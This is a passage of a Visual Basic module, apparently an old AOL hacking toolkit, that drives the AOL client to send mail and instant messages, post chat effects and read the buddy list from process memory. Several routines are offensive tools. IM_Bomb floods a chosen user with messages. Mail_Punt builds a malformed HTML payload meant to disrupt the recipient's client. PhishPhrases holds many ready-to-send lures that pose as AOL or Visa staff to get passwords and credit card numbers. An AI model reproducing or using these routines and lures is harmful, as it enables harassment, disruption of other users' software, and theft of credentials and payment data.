        EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        Rich& = FindWindowEx(OpenSend&, 0&, "RICHCNTL", vbNullString)
        Combo& = FindWindowEx(OpenSend&, 0&, "_AOL_Combobox", vbNullString)
        fCombo& = FindWindowEx(OpenSend&, 0&, "_AOL_Fontcombo", vbNullString)
        Button1& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Button2& = FindWindowEx(OpenSend&, Button1&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Number = 13
        If AOL_Version = "4" Then Number = 11
        For DoIt& = 1 To Number
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
    Loop Until OpenSend& <> 0& And EditTo& <> 0& And EditCC& <> 0& And EditSubject& <> 0& And Rich& <> 0& And SendButton& <> 0& And Combo& <> 0& And fCombo& <> 0& & SendButton& <> Button1& And SendButton& <> Button2&
        TempSubject$ = GetText(EditSubject&)
        TempSubject$ = Right(TempSubject$, Len(TempSubject$) - 5)
        Call SendMessageByString(EditSubject&, WM_SETTEXT, 0, TempSubject$)
    Call SendMessageByString(EditTo&, WM_SETTEXT, 0, Who$)
    Call SendMessageByString(Rich&, WM_SETTEXT, 0, Message$)
    Do Until OpenSend& = 0& Or Error& <> 0&
        AOL& = FindWindow("AOL Frame25", vbNullString)
        MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
        Error& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
    Dead& = FindWindow("#32770", "America Online")
    Deadb& = FindWindowEx(Dead&, 0&, "Button", "OK")
    If Deadb& <> 0 Then
        Call SendMessage(Deadb&, WM_KEYDOWN, VK_SPACE, 0&)
        Call SendMessage(Deadb&, WM_KEYUP, VK_SPACE, 0&)
         SendChat ascii + Who + ", unable to send [" + MailNumber + "] - dead mail"
         Call PostMessage(OpenSend&, WM_CLOSE, 0&, 0&)
         Call Kill_SaveMail
         Exit Sub
    End If
        OpenSend& = FindSendWindow
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Number = 13
        If AOL_Version = "4" Then Number = 11
        For DoIt& = 1 To Number
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
        Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
        TimeOut 0.15
        Call PostMessage(FindForwardWindow&, WM_CLOSE, 0&, 0&)
    Loop
    If OpenSend& = 0& Then Call PostMessage(OpenForward&, WM_CLOSE, 0&, 0&)
Do
DoEvents
Loop Until FindForwardWindow& = 0
KeepNew& = FindWindowEx(fMail&, 0&, "_AOL_Icon", UserSN & "'s Online fMail")
KeepNew& = FindWindowEx(fMail&, KeepNew&, "_AOL_Icon", vbNullString)
KeepNew& = FindWindowEx(fMail&, KeepNew&, "_AOL_Icon", vbNullString)
KeepNew& = FindWindowEx(fMail&, KeepNew&, "_AOL_Icon", vbNullString)
Call SendMessage(KeepNew&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(KeepNew&, WM_LBUTTONUP, 0&, 0&)
Modal& = FindWindow("_AOL_Modal", vbNullString)
mIcon& = FindWindowEx(Modal&, 0&, "_AOL_Icon", vbNullString)
If mIcon& <> 0 Then
        Call SendMessage(mIcon&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(mIcon&, WM_LBUTTONUP, 0&, 0&)
        If mIcon& > 0 Then
            Call SendMessage(mIcon&, WM_LBUTTONDOWN, 0&, 0&)
            Call SendMessage(mIcon&, WM_LBUTTONUP, 0&, 0&)
        End If
End If
    AORich& = FindWindowEx(FindChatRoom, 0&, "RICHCNTL", vbNullString)
    AORich2& = FindWindowEx(FindChatRoom, AORich, "RICHCNTL", vbNullString)
    Call SendMessageByString(AORich2, WM_SETTEXT, 0&, ascii & Who & " [" & MailNumber + "] was sent")
    Do
    DoEvents
    Call SendMessageByString(AORich2, WM_CHAR, ENTER_KEY, 0&)
    Call SendMessageByString(AORich2, WM_CHAR, ENTER_KEY, 0&)
    Loop Until GetText(AORich2&) = ""
End Sub
Public Function ScrambleText(TheText As String) As String
Dim FindLastSpace As String, Scrambling As Integer, Char As String
Dim TheChar As String, SpeedBack As Integer, LastChar As String
Dim Chars As String, MidChar As String, Scrambled As String
Dim BackChar As String, FirstChar As String
FindLastSpace = Mid(TheText, Len(TheText), 1)
If Not FindLastSpace = " " Then
TheText = TheText & " "
Else
TheText = TheText
End If
For Scrambling = 1 To Len(TheText)
TheChar$ = Mid(TheText, Scrambling, 1)
Char$ = Char$ & TheChar$
If TheChar$ = " " Then
Chars$ = Mid(Char$, 1, Len(Char$) - 1)
FirstChar$ = Mid(Chars$, 1, 1)
On Error GoTo cityz
LastChar$ = Mid(Chars$, Len(Chars$), 1)
MidChar$ = Mid(Chars$, 2, Len(Chars$) - 2)
For SpeedBack = Len(MidChar$) To 1 Step -1
BackChar$ = BackChar$ & Mid$(MidChar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe
cityz:
Scrambled$ = Scrambled$ & FirstChar$ & " "
GoTo sniffs
sniffe:
Scrambled$ = Scrambled$ & LastChar$ & FirstChar$ & BackChar$ & " "
sniffs:
Char$ = ""
BackChar$ = ""
End If
Next Scrambling
ScrambleText = Scrambled$
Exit Function
End Function
Public Function Chat_SpaceTalk(What As String) As String
Dim inptxt As String, numspc As Integer
Dim NextChr As String, Lenth As Integer, newsent As String
Let inptxt$ = What
Let Lenth% = Len(inptxt$) - 1
Do While numspc% <= Lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
If NextChr$ = " " Then Let NextChr$ = NextChr$ + " ": GoTo HacK
Let NextChr$ = NextChr$ + " "
HacK:
Let newsent$ = newsent$ + NextChr$
Loop
Chat_SpaceTalk = newsent$
End Function

Public Function GetChatText() As String
Dim ChatText As String, AORich As Long
AORich& = FindWindowEx(FindChatRoom&, 0&, "RICHCNTL", vbNullString)
Call SetFocusAPI(AORich&)
ChatText = GetText(AORich&)
GetChatText = ChatText
End Function
Public Sub AOL_Show()
Dim AOL As Long
AOL = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL, SW_SHOW)
End Sub


Public Sub Attention(What As String)
SendChat "(`(`v^v^––––––––(( ATTENTION! ))–––––––––^v^o"
TimeOut 0.01
SendChat What
TimeOut 0.01
SendChat "(`(`v^v^––––––––(( ATTENTION! ))–––––––––^v^o"
End Sub

Public Function FindMailBox() As Long
    Dim AOL As Long, MDI As Long, Child As Long
    Dim TabControl As Long, TabPage As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    TabControl& = FindWindowEx(Child&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    If TabControl& <> 0& And TabPage& <> 0& Then
        FindMailBox& = Child&
        Exit Function
    Else
        Do
            Child& = FindWindowEx(MDI&, Child&, "AOL Child", vbNullString)
            TabControl& = FindWindowEx(Child&, 0&, "_AOL_TabControl", vbNullString)
            TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
            If TabControl& <> 0& And TabPage& <> 0& Then
                FindMailBox& = Child&
                Exit Function
            End If
        Loop Until Child& = 0&
    End If
    FindMailBox& = 0&
End Function

Public Function Blank_String() As String
Blank_String = Chr$(32) & Chr$(160)
End Function

Public Function Bot_8Ball() As String
Dim Tixt As String
Tixt = Int((Val(11) * Rnd) + 1)
Randomize Tixt
If Tixt = "1" Then
Tixt = "Looks doubtful."
ElseIf Tixt = "2" Then: Tixt = "Definately YES!"
ElseIf Tixt = "3" Then: Tixt = "Definately No!"
ElseIf Tixt = "4" Then: Tixt = "Not a FuKin chance"
ElseIf Tixt = "5" Then: Tixt = "HEEELLLLLLLLLLLL nO"
ElseIf Tixt = "6" Then: Tixt = "yea!"
ElseIf Tixt = "7" Then: Tixt = "Response Hazy, try again."
ElseIf Tixt = "8" Then: Tixt = "ProbabLee"
ElseIf Tixt = "9" Then: Tixt = "yep yep"
ElseIf Tixt = "10" Then: Tixt = "I'm not sure"
ElseIf Tixt = "11" Then: Tixt = "AbsolootLee yes!"
End If
Bot_8Ball = Tixt
End Function

Public Sub AddSysFonts(Lst As Object)
Dim i As Integer
For i = 0 To Screen.FontCount - 1
    Lst.AddItem Screen.Fonts(i)
Next i
End Sub

Public Sub AddBuddiesOnline(list As ListBox)
Dim AOL As Long, MDI As Long, Child As Long, bList As Long, Spce As String
Dim sThread As Long, mThread As Long, itmHold As Long, psnHold As Long
Dim ScreenName As String, cProcess As Long, index As Long, rBytes As Long


    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", "Buddy List Window")

    bList& = FindWindowEx(Child&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(bList&, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(bList&, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(bList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
                Spce = Left(ScreenName$, 2)
                If Spce = "  " Then
                ScreenName$ = Right(ScreenName$, Len(ScreenName$) - 2)
                    list.AddItem ScreenName$
                End If
        Next index&
        Call CloseHandle(mThread)
    End If
End Sub
Public Sub API_SPY(WinHdl As Label, WinClass As Label, WinTxt As Label, WinStyle As Label, WinIDNum As Label, WinPHandle As Label, WinPText As Label, WinPClass As Label, WinModule As Label)
' Call this in a timer with an Interval of 50
On Error Resume Next
Dim pt32 As POINTAPI, ptx As Long, pty As Long, sWindowText As String * 100
Dim sClassName As String * 100, hWndOver As Long, hWndParent As Long
Dim sParentClassName As String * 100, wID As Long, lWindowStyle As Long
Dim hInstance As Long, sParentWindowText As String * 100
Dim sModuleFileName As String * 100, R As Long
Static hWndLast As Long
    Call GetCursorPos(pt32)
    ptx = pt32.X
    pty = pt32.Y
    hWndOver = WindowFromPointXY(ptx, pty)
    If hWndOver <> hWndLast Then
        hWndLast = hWndOver
        WinHdl.Caption = "Window Handle: " & hWndOver
        R = GetWindowText(hWndOver, sWindowText, 100)
        WinTxt.Caption = "Window Text: " & Left(sWindowText, R)
        R = GetClassName(hWndOver, sClassName, 100)
        WinClass.Caption = "Window Class Name: " & Left(sClassName, R)
        lWindowStyle = GetWindowLong(hWndOver, GWL_STYLE)
        WinStyle.Caption = "Window Style: " & lWindowStyle
        hWndParent = GetParent(hWndOver)
            If hWndParent <> 0 Then
                wID = GetWindowWord(hWndOver, GWW_ID)
                WinIDNum.Caption = "Window ID Number: " & wID
                WinPHandle.Caption = "Parent Window Handle: " & hWndParent
                R = GetWindowText(hWndParent, sParentWindowText, 100)
                WinPText.Caption = "Parent Window Text: " & Left(sParentWindowText, R)
                R = GetClassName(hWndParent, sParentClassName, 100)
                WinPClass.Caption = "Parent Window Class Name: " & Left(sParentClassName, R)
            Else
                WinIDNum.Caption = "Window ID Number: N/A"
                WinPHandle.Caption = "Parent Window Handle: N/A"
                WinPText.Caption = "Parent Window Text : N/A"
                WinPClass.Caption = "Parent Window Class Name: N/A"
            End If
                hInstance = GetWindowWord(hWndOver, GWW_HINSTANCE)
                R = GetModuleFileName(hInstance, sModuleFileName, 100)
        WinModule.Caption = "Module: " & Left(sModuleFileName, R)
    End If
End Sub

Public Sub NewUserReset(SN As String, Path As String)
On Error Resume Next
Dim l9E68 As Long
Dim l9E6A As Long
Dim l9E6C As Integer
Dim l9E6E As Integer
Dim l9E70 As Variant
Dim l9E74 As Integer, tru_sn  As String, paath As String
Screen.MousePointer = 11
Static m0226 As String * 40000
If UCase$(Trim$(SN)) = "NEWUSER" Then MsgBox ("AOL is already reset to NewUser!"): Exit Sub
On Error GoTo no_reset
If Len(SN) < 7 Then MsgBox ("The Screen Name will not work unless it is at least 7 characters, including spaces"): Exit Sub
tru_sn = "NewUser" + String$(Len(SN) - 7, " ")
Let paath$ = (Path & "\idb\main.idx")
Open paath$ For Binary As #1
l9E68& = 1
l9E6A& = LOF(1)
While l9E68& < l9E6A&
    m0226 = String$(40000, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
    Wend
    
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend

Seek #1, Len(SN)
l9E68& = Len(SN)
While l9E68& < l9E6A&
m0226 = String$(40000, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
        Wend
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend
Close #1
Screen.MousePointer = 0
no_reset:
Screen.MousePointer = 0
Exit Sub
Resume Next
End Sub
Public Function Chat_DotTalk(What As String) As String
Dim inptxt As String, numspc As Integer
Dim NextChr As String, Lenth As Integer, newsent As String
Let inptxt$ = What
Let Lenth% = Len(inptxt$) - 1
Do While numspc% <= Lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
If NextChr$ = " " Then Let NextChr$ = NextChr$ + " ": GoTo HacK
Let NextChr$ = NextChr$ + "•"
HacK:
Let newsent$ = newsent$ + NextChr$
Loop
Chat_DotTalk = newsent$
End Function

Public Function Decode_SN(ScreenName As String) As String
Dim SN As String, inptxt As String, numspc As Integer
Dim NextChr As String, Lenth As Integer, newsent As String
SN = LCase(ScreenName)
Let inptxt$ = SN
Let Lenth% = Len(inptxt$)
Do While numspc% <= Lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
Let NextChr$ = NextChr$ + " "
Let newsent$ = newsent$ + NextChr$
Loop
Decode_SN = newsent$
End Function

Public Function GetText(WindowHandle As Long) As String
    Dim buffer As String, TextLength As Long
    TextLength& = SendMessage(WindowHandle&, WM_GETTEXTLENGTH, 0&, 0&)
    buffer$ = String(TextLength&, 0&)
    Call SendMessageByString(WindowHandle&, WM_GETTEXT, TextLength& + 1, buffer$)
    GetText$ = buffer$
End Function
Public Function GetCaption(WindowHandle As Long) As String
    Dim buffer As String, TextLength As Long
    TextLength& = GetWindowTextLength(WindowHandle&)
    buffer$ = String(TextLength&, 0&)
    Call GetWindowText(WindowHandle&, buffer$, TextLength& + 1)
    GetCaption$ = buffer$
End Function
Public Sub IdleBot()
' This works for aol 4 & 5
' Call this in a Timer with an Interval of 1000
On Error Resume Next
Dim AOModal As Long, AOIcon As Long, AOTimer As Long
Dim AOIcon2 As Long
AOModal& = FindWindow("_AOL_Modal", vbNullString)
AOIcon& = FindWindowEx(AOModal&, 0&, "_AOL_Icon", vbNullString)
AOTimer& = FindWindow("_AOL_Palette", vbNullString)
AOIcon2& = FindWindowEx(AOTimer&, 0&, "_AOL_Icon", vbNullString)
If AOIcon& <> 0 Then ClickAOLIcon (AOIcon2&)
If AOIcon2& <> 0 Then ClickAOLIcon (AOIcon&)
End Sub

Public Sub IM_AnswerMachine(ReturnMessage As String, AD As String, List1 As ListBox)
'Put this code in a Timer with an interval of 500
Dim im As String, SNfromIM As String, Rich As Long
Dim heh As String, naw As String, Child As Long
Dim im2 As Long, AOL As Long, MDI As Long, Icon As Long
DoEvents
AOL = FindWindow("AOL Frame25", vbNullString)
MDI = FindWindowEx(AOL, 0&, "MDIClient", vbNullString)
Child = FindWindowEx(MDI, 0&, "AOL Child", vbNullString)
im = GetCaption(Child)
If InStr(im, "Instant Message From") <> 0 Then
naw = Mid(im, InStr(im, ":") + 2)
SNfromIM = naw
Call IM_Send(SNfromIM, ReturnMessage + Chr$(13) + Chr$(13) + Chr$(13))
List1.AddItem SNfromIM
Call PostMessage(Child, WM_CLOSE, 0&, 0&)
End If
End Sub

Public Sub IM_Bomb(Who As String, Message As String, HowMany As TextBox)
Do
DoEvents
Call IM_Send(Who$, Message$)
HowMany = HowMany - 1
TimeOut 0.25
Loop Until HowMany < 1
End Sub

Public Function IM_Text() As String
    Dim Rich As Long
    Dim AOL As Long, MDI As Long, Child As Long, Caption As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Caption$ = GetCaption(Child&)
    If InStr(Caption$, "Instant Message") = 1 Or InStr(Caption$, "Instant Message") = 2 Or InStr(Caption$, "Instant Message") = 3 Then
    Rich& = FindWindowEx(Child&, 0&, "RICHCNTL", vbNullString)
    IM_Text$ = GetText(Rich&)
    End If
End Function

Public Sub KillGlyph()
' Kills the annoying Spinning AOL Icon
Dim AOL As Long, AOTooL As Long, AOTool2 As Long
Dim Glyph As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
AOTooL& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
AOTool2& = FindWindowEx(AOTooL&, 0&, "_AOL_Toolbar", vbNullString)
Glyph& = FindWindowEx(AOTool2&, 0&, "_AOL_Glyph", vbNullString)
Call SendMessage(Glyph&, WM_CLOSE, 0, 0)
End Sub

Public Sub List_KillDupes(List1 As ListBox)
Dim i As Integer, SN As String, J As Integer, sn2 As String
For i = 0 To List1.ListCount - 1
    SN = List1.list(i)
        For J = 0 To List1.ListCount - 1
            sn2 = List1.list(J)
            If sn2 = SN Then
                List1.RemoveItem J
            End If
        Next J
Next i
End Sub

Public Sub List_Load(list As ListBox, Directory As String)
    Dim MyString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        DoEvents
        list.AddItem MyString$
    Wend
    Close #1
End Sub

Public Sub List_RemoveName(Who As String, List1 As ListBox)
Dim i As Integer
For i = 0 To List1.ListCount - 1
If LCase(List1.list(i)) = LCase(Who) Then
List1.RemoveItem i
End If
Next i
End Sub

Public Function EliteText(Word As String) As String
Dim Made As String, X As Integer, Q As Integer
Dim letter As String, leet As String
Made$ = ""
For Q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, Q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then leet$ = "â"
    If X = 2 Then leet$ = "å"
    If X = 3 Then leet$ = "ä"
    End If
    If letter$ = "b" Then leet$ = "b"
    If letter$ = "c" Then leet$ = "ç"
    If letter$ = "e" Then
    If X = 1 Then leet$ = "ë"
    If X = 2 Then leet$ = "ê"
    If X = 3 Then leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then leet$ = "ì"
    If X = 2 Then leet$ = "ï"
    If X = 3 Then leet$ = "î"
    End If
    If letter$ = "j" Then leet$ = ",j"
    If letter$ = "n" Then leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then leet$ = "ô"
    If X = 2 Then leet$ = "ð"
    If X = 3 Then leet$ = "õ"
    End If
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then leet$ = "ù"
    If X = 2 Then leet$ = "û"
    If X = 3 Then leet$ = "ü"
    End If
    If letter$ = "w" Then leet$ = "vv"
    If letter$ = "y" Then leet$ = "ÿ"
    If letter$ = "0" Then leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then leet$ = "Å"
    If X = 2 Then leet$ = "Ä"
    If X = 3 Then leet$ = "Ã"
    End If
    If letter$ = "B" Then leet$ = "ß"
    If letter$ = "C" Then leet$ = "Ç"
    If letter$ = "D" Then leet$ = "Ð"
    If letter$ = "E" Then leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then leet$ = "Ï"
    If X = 2 Then leet$ = "Î"
    If X = 3 Then leet$ = "Í"
    End If
    If letter$ = "N" Then leet$ = "(\/)"
    If letter$ = "N" Then leet$ = "Ñ"
    If letter$ = "O" Then leet$ = "Õ"
    If letter$ = "S" Then leet$ = "Š"
    If letter$ = "U" Then leet$ = "Û"
    If letter$ = "W" Then leet$ = "\X/"
    If letter$ = "Y" Then leet$ = "Ý"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q

EliteText = Made$

End Function
Public Sub List_Save(list As ListBox, Directory As String)
    Dim SaveList As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveList& = 0 To list.ListCount - 1
        Print #1, list.list(SaveList&)
    Next SaveList&
    Close #1
End Sub

Public Sub Mail_Punt(Who As String, subject As String, Message As String)
Dim Lag As String, Error As String
DoEvents
Lag = "<HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML>"
Error = "<HTML><IMG  SRC=""Tiles.exe"" ID=999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"" WIDTH=""1"" HEIGHT=""1"" BORDER=""0"" DATASIZE=""1000""><HTML><IMG  SRC=""Tiles.exe"" ID=999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"" WIDTH=""1"" HEIGHT=""1"" BORDER=""0"" DATASIZE=""1000""><HTML><IMG  SRC=""Tiles.exe"" ID=999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"" WIDTH=""1"" HEIGHT=""1"" BORDER=""0"" DATASIZE=""1000"">"""
Call Mail_Send(Who$, subject$, Message$ & Lag & Lag & Error & Lag)
End Sub

Public Sub Mail_Open()
Dim AOL As Long, MDI As Long, Tool As Long, Toolbar As Long
Dim ToolIcon As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
Tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
Toolbar& = FindWindowEx(Tool&, 0&, "_AOL_Toolbar", vbNullString)
ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
TimeOut 0.15
DoEvents
End Sub
Public Function PhishPhrases() As String

'Ex:  Text1 = PhishPhrases

Dim Phrazes As Integer
Randomize Phrazes
Phrazes = Int((Val("85") * Rnd) + 1)
If Phrazes = "1" Then
PhishPhrases = "Hi, I'm with AOL's Online Security. We have found hackers trying to get into your MailBox. Please verify your password immediately to avoid account termination.     Thank you.                                    AOL Staff"
ElseIf Phrazes = "2" Then
PhishPhrases = "Hello. I am with AOL's billing department. Due to some invalid information, we need you to verify your log-on password to avoid account cancellation. Thank you, and continue to enjoy America Online."
ElseIf Phrazes = "3" Then
PhishPhrases = "Good Evening. I am with AOL's Virus Protection Group. Due to some evidence of virus uploading, I must validate your sign-on password. Please STOP what you're doing and Tell me your password.       -- AOL VPG"
ElseIf Phrazes = "4" Then
PhishPhrases = "Hello, I am the Head Of AOL's XPI Link Department. Due to a configuration error in your version of AOL, I need you to verify your log-on password to me, to prevent account suspension and possible termination.  Thank You."
ElseIf Phrazes = "5" Then
PhishPhrases = "Hi. You are speaking with AOL's billing manager, Steve Case. Due to a virus in one of our servers, I am required to validate your password. You will be awarded an extra 10 FREE hours of air-time for the inconvenience."
ElseIf Phrazes = "6" Then
PhishPhrases = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
ElseIf Phrazes = "7" Then
PhishPhrases = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf Phrazes = "8" Then
PhishPhrases = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf Phrazes = "9" Then
PhishPhrases = "Hi, I'm Alex Troph of America Online Sevice Department. Your online account, #3560028, is displaying a billing error. We need you to respond back with your name, address, card number, expiration date, and daytime phone number. Sorry for this inconvenience."
ElseIf Phrazes = "10" Then
PhishPhrases = "Hello, I am a representative of the VISA Corp.  Due to a computer error, we are unable complete your membership to America Online. In order to correct this problem, we ask that you hit the `Respond` key, and reply with your full name and password, so that the proper changes can be made to avoid cancellation of your account. Thank you for your time and cooperation.  :-)"
ElseIf Phrazes = "11" Then
PhishPhrases = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records. Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again. Thank you.  :-)"
ElseIf Phrazes = "12" Then
PhishPhrases = "Hello I am a represenative of the Visa Corp. emp# C8205183W. Due to a malfunction in our system we were unable to process your registration to America Online. In order to correct this mistake, we ask that you hit the 'Respond' key, and reply with the following information: Name, Address, Telephone#, Visa Card#, and Expiration date. If this information is not processed promptly your account will be terminated. For any further questions please contact us at 1-800-336-8427. Thank You."
ElseIf Phrazes = "13" Then
PhishPhrases = "Hello, I am with the America Online New User Validation Department.  I am happy to inform you that your validation process is almost complete.  To complete your validation process I need you to please hit the `Respond` key and reply with the following information: Name, Address, Phone Number, City, State, Zip Code,  Credit Card Number, Expiration Date, and Bank Name.  Thank you for your time and cooperation and we hope that you enjoy America Online. :-)"
ElseIf Phrazes = "14" Then
PhishPhrases = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation."
ElseIf Phrazes = "15" Then
PhishPhrases = "Hello, this is the America Online Billing Department.  Due to a System Crash, we have lost your billing information.  Please hit respond, then enter your Credit Card Number, and experation date.  Thank You, and sorry for the inconvience."
ElseIf Phrazes = "16" Then
PhishPhrases = "ATTENTION:  This is the America Online billing department.  Due to an error that occured in your Membership Enrollment process we did not receieve your billing information.  We need you to reply back with your Full name, Credit card number with Expiration date, and your telephone number.  We are very sorry for this inconvenience and hope that you continue to enjoy America Online in the future."
ElseIf Phrazes = "17" Then
PhishPhrases = "Sorry, there seems to be a problem with your bill. Please reply with your password to verify that you are the account holder.  Thank you."
ElseIf Phrazes = "18" Then
PhishPhrases = "Sorry  the credit card you entered is invalid. Perhaps you mistyped it?  Please reply with your credit card number, expiration date, name on card, billing address, and phone number, and we will fix it. Thank you and enjoy AOL."
ElseIf Phrazes = "19" Then
PhishPhrases = "Sorry, your credit card failed authorization. Please reply with your credit card number, expiration date, name on card, billing address, and phone number, and we will fix it.  Thank you and enjoy AOL."
ElseIf Phrazes = "20" Then
PhishPhrases = "Due to the numerous use of identical passwords of AOL members, we are now generating new passwords with our computers.  Your new password is 'Stryf331', You have the choice of the new or old password.  Click respond and try in your preferred password.  Thank you"
ElseIf Phrazes = "21" Then
PhishPhrases = "I work for AOL's Credit Card department. My job is to check EVERY AOL account for credit accuracy.  When I got to your account, I am sorry to say, that the Credit information is now invalid. We DID have a sysem crash, which my have lost the information, please click respond and type your VALID credit card info.  Card number, names, exp date, etc, Thank you!"
ElseIf Phrazes = "22" Then
PhishPhrases = "Hello I am with AOL Account Defense Department.  We have found that your account has been dialed from San Antonia,Texas. If you have not used it there, then someone has been using your account.  I must ask for your password so I can change it and catch him using the old one.  Thank you."
ElseIf Phrazes = "23" Then
PhishPhrases = "Hello member, I am with the TOS department of AOL.  Due to the ever changing TOS, it has dramatically changed.  One new addition is for me, and my staff, to ask where you dialed from and your password.  This allows us to check the REAL adress, and the password to see if you have hacked AOL.  Reply in the next 1 minute, or the account WILL be invalidated, thank you."
ElseIf Phrazes = "24" Then
